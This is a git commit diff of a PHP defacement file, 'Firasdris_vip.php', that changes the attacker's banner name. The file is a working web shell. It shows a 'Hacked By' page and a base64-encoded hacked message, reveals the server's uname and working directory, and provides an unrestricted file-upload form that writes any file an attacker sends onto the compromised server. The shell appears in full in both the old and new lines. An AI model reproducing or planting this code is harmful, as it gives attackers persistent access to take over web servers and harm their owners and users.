2d5e8340f578a2902ea019f682d211414e648bff
firasdris54487 <61518027+firasdris54487@users.noreply.github.com>
2020-02-26 20:42:44 +0100

    Update Firasdris_vip.php

--- Firasdris_vip.php
+++ Firasdris_vip.php
@@ -3,7 +3,7 @@ $str = 'SGFja2VkIEJ5IEZpcmFzZHJpcw==';echo base64_decode($str);
 
 ?>
 <title>Vuln!! patch it Now! Hacked By Firas Dris</title>
-<?php echo 'MisterSpyv7up uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+<?php echo 'FirasDris uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
 ?>
 <?php
 $ip = getenv("REMOTE_ADDR");
